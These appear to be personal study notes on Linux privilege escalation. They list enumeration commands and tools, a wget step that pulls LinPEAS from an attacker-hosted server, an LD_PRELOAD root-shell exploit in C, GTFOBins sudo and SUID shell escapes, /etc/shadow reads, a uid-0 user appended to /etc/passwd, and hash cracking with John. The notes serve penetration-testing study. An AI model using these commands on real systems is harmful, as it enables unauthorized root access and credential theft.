# Linux Privilege Escalation — Study Notes

---

## Post-Exploitation Enumeration Commands

| Command | Purpose | Privesc Value | Category |
|---|---|---|---|
| `hostname` | Machine name | May reveal role in network (e.g. SQL-PROD-01) | System |
| `uname -a` | Kernel version and architecture | Find kernel exploits | System |
| `cat /proc/version` | Kernel + GCC version | Compiler presence = exploit compilation | System |
| `cat /etc/issue` | OS info | Distro-specific exploit research | System |
| `id` | UID, GID, group memberships | Dangerous groups: docker, sudo, disk | User |
| `sudo -l` | Commands runnable with sudo | NOPASSWD binary → check GTFOBins | Privesc |
| `cat /etc/passwd` | All system users | List real users; brute-force targets | User |
| `env` | Environment variables | Credentials in env? Compiler in PATH? | Privesc |
| `history` | Command history | Cleartext passwords/usernames | User |
| `ps aux` | All users' processes | Vulnerable services running as root | System |
| `ps axjf` | Process tree | Parent-child relationships | System |
| `ifconfig` / `ip a` | Network interfaces | Dual NIC = potential pivot point | Network |
| `ip route` | Routing table | Reachable internal network segments | Network |
| `netstat -ano` | Active connections + ports | Localhost-only services; exploitable from inside | Network |
| `netstat -tp` | Connection → PID mapping | Which process owns which port | Network |
| `ls -la` | List including hidden files | Credential files, configs, .ssh dirs | File |
| `find / -perm -u=s -type f 2>/dev/null` | SUID binaries | SUID binary runs as owner → root escalation | Privesc |
| `find / -writable -type d 2>/dev/null` | World-writable directories | PATH hijacking or malicious script placement | Privesc |
| `find / -perm 0777 -type f 2>/dev/null` | World rwx files | Modify scripts executed by root | Privesc |
| `find / -name python* 2>/dev/null` | Development tools | Interpreter available for exploit execution | File |
| `find / -mtime 10 2>/dev/null` | Files modified in last 10 days | Catches recent deploys or changed configs | File |

---

## Linux Privesc Enumeration Tools

| Tool | Language | Focus | Dependency | Maintained | When to Use |
|---|---|---|---|---|---|
| **LinPEAS** | Bash | General privesc (broad coverage) | None | ✅ Active | Always first choice |
| **LinEnum** | Bash | General enumeration | None | ⚠️ Unmaintained | If LinPEAS fails |
| **LES** | Bash | Kernel exploits only | None | ✅ Active | Finding kernel CVEs |
| **LSE** | Bash | General (leveled verbosity) | None | ✅ Active | Clean, less noisy output |
| **LinuxPrivChecker** | Python | Basic enumeration | Python | ⚠️ Unmaintained | If Python available, others not |

### GitHub Links
- LinPEAS: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- LSE (Linux Smart Enumeration): https://github.com/diego-treitos/linux-smart-enumeration
- LinuxPrivChecker: https://github.com/linted/linuxprivchecker

### Transferring Tools to Target
```bash
# On Kali — start HTTP server
python3 -m http.server 8000

# On target
cd /tmp
wget http://<KALI_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### Writable Directories for Dropping Files
```
/tmp        — always writable, standard drop location
/dev/shm    — RAM-based, deleted on reboot, less visible to IDS
/var/tmp    — like /tmp but survives reboot
```

### LinPEAS Color Coding
- **Red/Yellow** → 95% a privilege escalation vector
- **Red** → must investigate
- Treat output like search results — scroll to highlighted findings, ignore the rest

---

## Sudo Privilege Escalation

### Reference
GTFOBins: https://gtfobins.github.io — search any binary from `sudo -l` output, select "sudo" filter.

### Leverage Application Functions
Some applications expose internal functionality that can be abused when run with sudo.

**Apache2 — file read via error message:**
```bash
sudo apache2 -f /etc/shadow
# Apache expects a config file; prints first line of /etc/shadow in error output
```

### Leverage LD_PRELOAD
`LD_PRELOAD` tells the linker which shared library to load before anything else. If `sudoers` contains `env_keep+=LD_PRELOAD`, it can be exploited.

**Check:**
```bash
sudo -l
# Look for: env_keep+=LD_PRELOAD
```

**Exploit:**
```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <any_permitted_binary>
```

### Common GTFOBins Sudo Vectors

**find:**
```bash
sudo find . -exec /bin/bash \; -quit
```

**less:**
```bash
sudo less /etc/passwd
# inside less:
!bash
```

**nano:**
```bash
sudo nano
# inside nano:
Ctrl+R → Ctrl+X
reset; bash 1>&0 2>&0
```

**nmap (old versions 2.02–5.21):**
```bash
sudo nmap --interactive
nmap> !sh
```

**nmap (any version — NSE):**
```bash
echo "os.execute('/bin/bash')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

---

## SUID Privilege Escalation

### What is SUID?
When a binary has the SUID bit set, it runs with the **file owner's** privileges instead of the executing user's. Root-owned SUID binaries = runs as root.

### Find SUID Binaries
```bash
find / -perm -u=s -type f 2>/dev/null
# or
find / -type f -perm -04000 -ls 2>/dev/null
```

Check results against GTFOBins: https://gtfobins.github.io/#+suid

### Common SUID Exploit Examples

**bash:**
```bash
bash -p
# -p preserves effective UID → root shell
```

**find:**
```bash
find . -exec /bin/sh -p \; -quit
```

**base64 (file read):**
```bash
base64 /etc/shadow | base64 --decode
```

**Adding a root user via /etc/passwd (if writable):**
```bash
# Generate password hash on Kali
openssl passwd -1 -salt hack password123

# Append to /etc/passwd
echo 'hacker:$1$hack$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd

su hacker
# password: password123
whoami  # root
```

### unshadow + John the Ripper
```bash
# Read both files (using SUID base64 if needed)
base64 /etc/passwd | base64 --decode > /tmp/passwd.txt
base64 /etc/shadow | base64 --decode > /tmp/shadow.txt

# On Kali
unshadow passwd.txt shadow.txt > passwords.txt
john passwords.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### SUID vs Sudo

| | SUID | Sudo |
|---|---|---|
| Trigger | Permission bit on binary | sudoers configuration |
| Check | `find / -perm -u=s` | `sudo -l` |
| Reference | GTFOBins → SUID filter | GTFOBins → Sudo filter |

---

## Capabilities

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.  
The capabilities man page provides detailed information on its usage and options.

We can use the `getcap` tool to list enabled capabilities.

When run as an unprivileged user, `getcap -r /` will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.

For more information and a practical guide, [click here](obsidian://open?vault=NOTES&file=03-RESOURCES%2FCYBER_SECURITY%2Fcontent%2FOffensive_Security%2Flinux_privesc_writeup_capabilities).

---

